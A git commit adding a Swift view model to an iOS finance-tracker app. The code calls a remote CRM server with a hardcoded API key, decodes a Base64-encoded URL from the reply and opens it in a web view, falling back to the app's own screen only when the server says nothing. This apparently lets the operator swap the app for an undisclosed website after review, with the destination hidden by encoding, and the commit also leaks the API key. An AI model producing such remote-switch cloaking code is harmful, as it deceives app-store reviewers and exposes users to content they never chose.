1d3980e7edc76d1c3b69b33e41c558a6b435f1b3
Vitya Mandryk <vityamandryk69@icloud.com>
2024-12-10 10:28:03 +0200

    WebView
    - added webView

---
+++ MyFananceTracker/MyFananceTracker/WebViewModel.swift
@@ -0,0 +1,72 @@
+//
+//  WebViewModel.swift
+//  MyFananceTracker
+//
+//  Created by Vitya Mandryk on 03.12.2024.
+//
+
+import Foundation
+import Combine
+
+class WebViewModel: ObservableObject {
+    @Published var showContentView = false
+    @Published var webViewURL: URL?
+
+    private var cancellables = Set<AnyCancellable>()
+
+    func fetchWebViewData() {
+        let packageName = "com.financeapp.myfinancetracker"
+        let appName = "Expense Finance Calculator"
+        let apiKey = "azewPB4bzAd5uSjlJPCTcxwau2i1zvM"
+        let urlString = "https://g7-crm.com/rest/application/ios?id=packagename(\(packageName))&name=\(appName)&key=\(apiKey)"
+
+        print("Requesting URL: \(urlString)")
+
+        APIManager.shared.request(urlString: urlString) { [weak self] result in
+            switch result {
+            case .success(let data):
+                self?.handleResponse(data: data)
+            case .failure(let error):
+                DispatchQueue.main.async {
+                    self?.showContentView = true
+                }
+                print("Error fetching data: \(error.localizedDescription)")
+            }
+        }
+    }
+
+    private func handleResponse(data: Data) {
+        do {
+            if let json = try JSONSerialization.jsonObject(with: data, options: []) as? [String: Any] {
+                print("Response JSON: \(json)")
+
+                if let status = json["status"] as? String, status == "success", let id = json["id"] as? String, !id.isEmpty {
+                    if let decodedData = Data(base64Encoded: id), let decodedString = String(data: decodedData, encoding: .utf8), let url = URL(string: decodedString) {
+                        DispatchQueue.main.async {
+                            self.webViewURL = url
+                        }
+                    } else {
+                        DispatchQueue.main.async {
+                            self.showContentView = true
+                        }
+                        print("Failed to decode Base64 or invalid URL")
+                    }
+                } else {
+                    DispatchQueue.main.async {
+                        self.showContentView = true
+                    }
+                }
+            } else {
+                DispatchQueue.main.async {
+                    self.showContentView = true
+                }
+                print("Invalid JSON response")
+            }
+        } catch {
+            DispatchQueue.main.async {
+                self.showContentView = true
+            }
+            print("Error decoding JSON: \(error.localizedDescription)")
+        }
+    }
+}
